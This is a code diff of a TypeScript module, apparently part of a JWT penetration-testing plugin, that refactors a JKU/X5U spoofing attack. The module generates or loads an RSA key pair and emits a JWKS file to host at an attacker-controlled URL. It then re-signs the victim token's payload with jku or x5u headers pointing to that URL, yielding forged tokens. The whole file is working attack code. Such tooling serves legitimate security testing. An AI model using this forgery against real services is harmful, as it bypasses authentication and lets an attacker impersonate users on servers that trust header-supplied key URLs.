@@ -1,5 +1,5 @@
 /**
- * JKU / X5U Spoofing Attacks
+ * JKU / X5U Spoofing Attacks (a.k.a. JWKS Injection via attacker-hosted keys)
  *
  * jku (JSON Web Key Set URL): Attacker sets the jku header to a URL they control
  *   hosting a JWKS containing their own public key, then re-signs with the
@@ -7,117 +7,85 @@
  *
  * x5u (X.509 URL): Same idea via the x5u header pointing to a certificate.
  *
- * Requires the user to configure a jwksUrl in plugin settings and host the
- * provided JWKS file at that URL.
+ * A fresh RSA key pair is generated automatically when no key pair is configured
+ * in plugin settings. The user must host the emitted JWKS document at the
+ * configured jwksUrl for the server to fetch it.
  */
 
-import { signRSA, signECDSA } from "../crypto/jwt.js";
-import { generateRSAKeyPair, buildJWKSDocument } from "../crypto/rsa.js";
-import { generateECKeyPair, buildECJWKS } from "../crypto/ecdsa.js";
-import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
+import { signRSA } from "../crypto/jwt.js";
+import { generateRSAKeyPair, buildJWKSDocument, publicKey2jwk, type RSAKeyPair } from "../crypto/rsa.js";
+import type { ParsedJWT, AttackResult, PluginConfig, JWK } from "../types.js";
 import { nanoid } from "../util.js";
 
 export function buildJKUSpoofAttacks(
   parsed: ParsedJWT,
-  config: PluginConfig
+  config: PluginConfig,
+  rsaKeyPair?: RSAKeyPair
 ): { attacks: AttackResult[]; jwksContent: string | null; jwksKey: string | null } {
-  const alg = parsed.header.alg as string;
   const results: AttackResult[] = [];
-  let jwksContent: string | null = null;
-  let jwksKey: string | null = null;
 
   if (!config.jwksUrl) {
     return { attacks: [], jwksContent: null, jwksKey: null };
   }
 
-  // Determine algorithm
-  const targetAlg = alg.startsWith("ES") ? alg : "RS256";
   const kid = "jwt-attacker-spoof-key";
 
-  let publicJwk: Record<string, unknown>;
+  // Resolve the key material: prefer a configured key pair, otherwise generate.
   let privateKeyPem: string;
-  let jwks: object;
+  let publicJwk: JWK;
 
-  if (targetAlg.startsWith("ES")) {
-    const ecAlg = targetAlg as "ES256" | "ES384" | "ES512";
-    if (config.customPrivateKeyPem) {
-      privateKeyPem = config.customPrivateKeyPem;
-      // Build JWK from configured key — use a placeholder public key for JWKS
-      const kp = generateECKeyPair(ecAlg);
-      publicJwk = kp.publicJwk as Record<string, unknown>;
-    } else {
-      const kp = generateECKeyPair(ecAlg);
-      publicJwk = kp.publicJwk as Record<string, unknown>;
-      privateKeyPem = kp.privateKeyPem;
-    }
-    jwks = buildECJWKS(publicJwk, ecAlg, kid);
+  if (config.customPrivateKeyPem && config.customPublicKeyPem) {
+    privateKeyPem = config.customPrivateKeyPem;
+    publicJwk = publicKey2jwk(config.customPublicKeyPem);
   } else {
-    if (config.customPrivateKeyPem) {
-      privateKeyPem = config.customPrivateKeyPem;
-      const kp = generateRSAKeyPair(2048);
-      publicJwk = kp.publicJwk as Record<string, unknown>;
-    } else {
-      const kp = generateRSAKeyPair(2048);
-      publicJwk = kp.publicJwk as Record<string, unknown>;
-      privateKeyPem = kp.privateKeyPem;
-    }
-    jwks = buildJWKSDocument(publicJwk, kid);
+    const kp = rsaKeyPair ?? generateRSAKeyPair(2048);
+    privateKeyPem = kp.privateKeyPem;
+    publicJwk = kp.publicJwk;
   }
 
-  jwksContent = JSON.stringify(jwks, null, 2);
-  jwksKey = privateKeyPem;
+  const jwks = buildJWKSDocument({ ...publicJwk, kid }, kid);
+  const jwksContent = JSON.stringify(jwks, null, 2);
+  const jwksKey = privateKeyPem;
+
+  const sign = (extraHeader: Record<string, unknown>): string => {
+    const header = {
+      ...parsed.header,
+      alg: "RS256",
+      kid,
+      jwk: undefined,
+      jku: undefined,
+      x5u: undefined,
+      x5c: undefined,
+      ...extraHeader,
+    };
+    return signRSA(header as Parameters<typeof signRSA>[0], parsed.payload, privateKeyPem, "RS256");
+  };
 
   // JKU attack
   try {
-    const headerJku = {
-      ...parsed.header,
-      alg: targetAlg,
-      jku: config.jwksUrl,
-      kid,
-      jwk: undefined,
-      x5u: undefined,
-      x5c: undefined,
-    };
-    const jwt = targetAlg.startsWith("ES")
-      ? signECDSA(headerJku as Parameters<typeof signECDSA>[0], parsed.payload, privateKeyPem, targetAlg as "ES256" | "ES384" | "ES512")
-      : signRSA(headerJku as Parameters<typeof signRSA>[0], parsed.payload, privateKeyPem, "RS256");
-
     results.push({
       id: nanoid(),
       technique: "jkuSpoof",
-      techniqueName: `JKU Spoofing (${targetAlg})`,
+      techniqueName: "JKU Spoofing (RS256)",
       description:
-        `Sets the jku header to ${config.jwksUrl} and signs with a fresh private key. ` +
+        `Sets the jku header to ${config.jwksUrl} and signs with the generated private key. ` +
         "The server must be able to reach your JWKS endpoint. " +
         "Host the generated JWKS JSON at that URL before sending this request.",
-      modifiedJWT: jwt,
+      modifiedJWT: sign({ jku: config.jwksUrl }),
       timestamp: Date.now(),
     });
   } catch { /* ignore */ }
 
   // X5U attack (same key, x5u header instead)
   try {
-    const headerX5u = {
-      ...parsed.header,
-      alg: targetAlg,
-      x5u: config.jwksUrl, // same URL — user can host a cert chain there too
-      kid,
-      jwk: undefined,
-      jku: undefined,
-      x5c: undefined,
-    };
-    const jwt = targetAlg.startsWith("ES")
-      ? signECDSA(headerX5u as Parameters<typeof signECDSA>[0], parsed.payload, privateKeyPem, targetAlg as "ES256" | "ES384" | "ES512")
-      : signRSA(headerX5u as Parameters<typeof signRSA>[0], parsed.payload, privateKeyPem, "RS256");
-
     results.push({
       id: nanoid(),
       technique: "x5uSpoof",
-      techniqueName: `X5U Spoofing (${targetAlg})`,
+      techniqueName: "X5U Spoofing (RS256)",
       description:
-        `Sets the x5u header to ${config.jwksUrl} and signs with a fresh private key. ` +
-        "Host the generated JWKS / certificate chain at that URL.",
-      modifiedJWT: jwt,
+        `Sets the x5u header to ${config.jwksUrl} and signs with the generated private key. ` +
+        "Host the generated certificate / key at that URL.",
+      modifiedJWT: sign({ x5u: config.jwksUrl }),
       timestamp: Date.now(),
     });
   } catch { /* ignore */ }
